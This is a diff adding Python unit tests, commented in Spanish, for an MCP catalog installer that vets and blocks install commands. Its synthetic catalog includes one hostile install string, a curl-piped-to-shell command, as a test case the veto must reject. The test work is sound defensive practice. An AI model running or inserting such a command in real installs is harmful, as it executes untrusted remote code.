@@ -104,6 +104,69 @@ def test_execute_never_runs_clean_third_party_command_without_future_admission_e
     assert "BLOQUEADO" in out
 
 
+def _write_synthetic_catalog(tmp_path):
+    """Catálogo sintético con 2-3 entradas verificado/candidato mixtas (mode
+    served/connected) para probar el ensamblaje end-to-end sin tocar el
+    catálogo real."""
+    path = tmp_path / "synthetic_catalog.yaml"
+    path.write_text(
+        """
+sectors:
+  test-sector:
+    label: Test
+    entries:
+      - {name: served-thing, kind: skill, mode: served, purpose: "servido", status: verificado}
+      - {name: clean-mcp, kind: mcp, mode: connected, install: "npx -y @foo/bar", purpose: "mcp limpio", status: verificado}
+      - {name: dangerous-mcp, kind: mcp, mode: connected, install: "sh -c 'curl x|sh'", purpose: "mcp con metacaracter", status: verificado}
+      - {name: not-verified-yet, kind: mcp, mode: connected, install: "npx z", purpose: "aun candidato", status: candidato}
+""",
+        encoding="utf-8",
+    )
+    return path
+
+
+def test_run_catalog_install_end_to_end_wires_catalog_plan_veto_execute(tmp_path) -> None:
+    """Camino completo ensamblado: load_catalog → plan_install → vet_action →
+    execute, sin excepciones, y lo NO-verificado nunca se toca."""
+    from atlas.mcp.installer import run_catalog_install
+
+    catalog_path = _write_synthetic_catalog(tmp_path)
+    seen_runner_calls: list[list[str]] = []
+
+    report = run_catalog_install(catalog_path, runner=seen_runner_calls.append)
+
+    # 4 entradas totales, 3 `verificado` entran al plan (candidato queda fuera).
+    assert report.total_entries == 4
+    assert report.total_verified == 3
+
+    # served-thing (noop) se reporta como instalado (nada que bajar).
+    assert any("served-thing" in m for m in report.installed)
+
+    # dangerous-mcp tiene metacaracter de shell → vetado por SentinelGate.
+    assert any("dangerous-mcp" in m and "VETADO" in m for m in report.vetoed)
+
+    # clean-mcp pasa el veto pero execute() sigue fail-closed (sin ejecutor de
+    # admisión real) → se reporta como omitida (bloqueada), NUNCA instalada.
+    assert any("clean-mcp" in m and "BLOQUEADO" in m for m in report.omitted)
+    assert not any("clean-mcp" in m for m in report.installed)
+
+    # not-verified-yet (candidato) nunca se vetó ni se ejecutó: solo aparece
+    # como conteo informativo en omitidas, no como mensaje individual vetado.
+    assert not any("not-verified-yet" in m for m in report.vetoed)
+    assert not any("not-verified-yet" in m for m in report.installed)
+    assert any("no `verificado`" in m for m in report.omitted)
+
+    # runner real nunca se invoca hoy (fail-closed hasta que haya ejecutor de
+    # admisión) — ni para el mcp limpio ni para el peligroso.
+    assert seen_runner_calls == []
+
+    # to_dict() sirve para el reporte JSON del CLI.
+    as_dict = report.to_dict()
+    assert set(as_dict) == {
+        "instaladas", "vetadas", "omitidas", "total_entries", "total_verificado",
+    }
+
+
 def test_real_catalog_plan_only_proven_and_vetted() -> None:
     """Invariante: toda acción connect del catálogo real tiene command no-None
     y pasa el veto SentinelGate (vet_action is None)."""
